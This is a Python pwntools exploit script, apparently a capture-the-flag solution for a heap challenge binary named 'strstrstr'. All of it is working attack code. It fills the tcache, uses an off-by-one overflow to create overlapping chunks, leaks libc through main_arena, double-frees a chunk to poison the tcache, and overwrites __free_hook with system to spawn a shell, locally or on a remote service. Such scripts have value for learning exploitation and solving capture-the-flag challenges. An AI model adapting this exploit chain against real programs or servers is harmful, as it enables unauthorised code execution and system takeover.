#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./strstrstr"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def store(idx: int, buf):
    p.sendlineafter('command:', '0')
    p.sendlineafter('index:', str(idx))
    p.sendlineafter('string:', buf)

def show(idx: int):
    p.sendlineafter('command:', '1')
    p.sendlineafter('index:', str(idx))
    p.recvuntil(b'\x20')
    return p.recvline().rstrip(b'\n')

def delete(idx: int):
    p.sendlineafter('command:', '2')
    p.sendlineafter('index:', str(idx))

# prepare for fill tcache
for i in range(7):
    store(i, b'D' * 0x80)

for i in range(7):
    store(7 + i, b'E' * 0xf0)

store(14, b'A' * 0x80) # chunk A
store(15, B'B' * 0x10) # chunk B

# fill tcache (0x80)
for i in range(7):
    delete(i)

store(0, b'C' * 0xf0) # chunk C
store(1, b'F' * 0x10) # stop merge into top

"""
Chunk(addr=0x55af7200dd40, size=0x90, flags=PREV_INUSE, fd=0x4141414141414141, bk=0x4141414141414141)
Chunk(addr=0x55af7200ddd0, size=0x20, flags=PREV_INUSE, fd=0x4242424242424242, bk=0x4242424242424242)
Chunk(addr=0x55af7200ddf0, size=0x100, flags=PREV_INUSE, fd=0x4343434343434343, bk=0x4343434343434343)
"""

# A will be sent to unsorted bin
delete(14)

for i in range(8):
    delete(15)
    store(15, b'G' * (0x18 - i))

# Heap Overflow using chunk B (off-by-one)
delete(15)
store(15, b'H' * 0x10 + b'\xb0')

# fill tcache (0xf0)
for i in range(7):
    delete(i + 7)
# free chunk C
delete(0)

# chunk A, B, C are recognized as a single unused 0x1b0 chunk

# pick out all of 0x80 chunk from tcache
for i in range(7):
    store(i, b'I' * 0x80)
# reallocate chunk A
store(14, b'J' * 0x80)

# leak main_arena from chunk B (at unsorted bin)
leak = u64(show(15) + b'\0' * 2)
log.info("leak: " + hex(leak))
libc_base = leak - 0x3ebca0
log.info("libc base: " + hex(libc_base))

# dup chunk B
store(0, b'K')

# double free ! (at tcache 0x20)
delete(15)# chunk B
delete(0) # chunk B (dup)

free_hook_addr = libc_base + libc.symbols['__free_hook']
log.info("__free_hook: " + hex(free_hook_addr))
system_libc_addr = libc_base + libc.symbols['system']
log.info("system@libc: " + hex(system_libc_addr))

store(15, p64(free_hook_addr))
store(15, p64(0xdeadbeefcafebabe))
store(15, p64(system_libc_addr))

store(0, '/bin/sh')
delete(0)

p.interactive()
